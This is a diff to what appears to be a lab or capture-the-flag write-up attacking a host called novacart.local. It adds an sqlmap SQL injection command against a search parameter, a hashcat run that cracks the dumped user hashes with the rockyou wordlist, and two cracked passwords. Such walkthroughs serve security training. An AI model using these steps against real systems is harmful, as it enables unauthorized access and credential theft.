@@ -201,7 +201,7 @@ Whats interesting is there is a search function that is pulling from a file, cou
 
 Doesnt appear to be vulnerable to SQLi
 
-# SQLi
+# SQLi leads to initial access
 
 ```python
 sqlmap -u http://novacart.local/search.aspx?q=graphics --batch --flush-session --dbs --risk 3 --level 5
@@ -250,6 +250,17 @@ Table: users
 ```
 Found some users and some password hashes
 
+## Cracking hashes
 
+```python
+hashcat sqli-hashes.txt /usr/share/wordlists/rockyou.txt -m 1420
+
+65a3657685b09db625ef25da7754d7d140e75c3640dc2482de87218ee8d85b2b:jb44:password123
+bf9b834e082c88823b59d05446a819276a907114c928505b829ddbbad73d6d35:jb42:kubarow
+```
+So its cracked two hashes
+
+```p
+```
 
 
